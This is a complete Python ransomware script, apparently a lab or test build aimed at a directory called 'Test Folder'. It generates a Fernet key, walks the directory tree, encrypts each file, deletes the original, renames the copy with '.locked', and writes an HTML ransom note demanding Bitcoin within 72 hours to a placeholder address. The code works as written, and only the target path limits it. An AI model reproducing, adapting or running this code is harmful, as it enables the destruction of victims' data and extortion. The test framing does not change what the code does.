import os
from pathlib import Path
from cryptography.fernet import Fernet
import hashlib

# ── CONFIG ─────────────────────────────────────────────
REPO_ROOT         = Path(__file__).resolve().parents[3]
TARGET_DIR        = REPO_ROOT / "Test Folder"
KEY_FILE          = "key.txt"
NOTE_FILENAME     = "READ_ME.html"
LOCKED_EXTENSION  = ".locked"

# ── STEP 1: Create & save the Fernet key ───────────────
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

# ── STEP 2: Create a one-way ransom ID (non-verifiable) ─
def create_ransom_id(key):
    salt = os.urandom(16)
    return hashlib.sha256(salt + key).hexdigest()

# ── STEP 3: Encrypt one file & rename ───────────────────
def encrypt_file(path, fernet):
    with open(path, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)

    new_path = path + LOCKED_EXTENSION
    with open(new_path, "wb") as f:
        f.write(encrypted)
    os.remove(path)
    return new_path

# ── STEP 4: Walk & encrypt, track affected dirs ────────
def encrypt_tree_and_collect_dirs(root_dir, fernet):
    dirs_with_encryptions = set()

    for curr_dir, _, files in os.walk(root_dir):
        for fname in files:
            # skip key file, skip already-locked or the note itself
            if fname in (KEY_FILE, NOTE_FILENAME) or fname.endswith(LOCKED_EXTENSION):
                continue
            # skip your script or disguise exts
            if fname.lower().endswith((".py", ".exe", ".jpg")):
                continue

            full_path = os.path.join(curr_dir, fname)
            encrypt_file(full_path, fernet)
            dirs_with_encryptions.add(curr_dir)

    return dirs_with_encryptions

# ── STEP 5: Drop note in each dir ───────────────────────
def drop_ransom_notes(dirs, ransom_id):
    note_html = f"""
<html>
  <head><title>Your Files Are Encrypted</title></head>
  <body style="background:#111;color:#f33;font-family:Arial;text-align:center;padding:50px;">
    <h1>💀 Your Files Have Been Encrypted 💀</h1>
    <p>Send 0.1 BTC to: <b>1FakeBitcoinAddr…</b></p>
    <p>Your Ransom ID: <code>{ransom_id}</code></p>
    <p>Email decrypt@fake-email.com after payment.</p>
    <p>72 hour deadline!</p>
  </body>
</html>
""".lstrip()

    for d in dirs:
        note_path = os.path.join(d, NOTE_FILENAME)
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(note_html)
        print(f"[+] Note dropped in: {note_path}")

# ── MAIN ───────────────────────────────────────────────
def main():
    key = generate_key()
    ransom_id = create_ransom_id(key)
    fernet = Fernet(key)

    dirs = encrypt_tree_and_collect_dirs(TARGET_DIR, fernet)
    drop_ransom_notes(dirs, ransom_id)

if __name__ == "__main__":
    main()
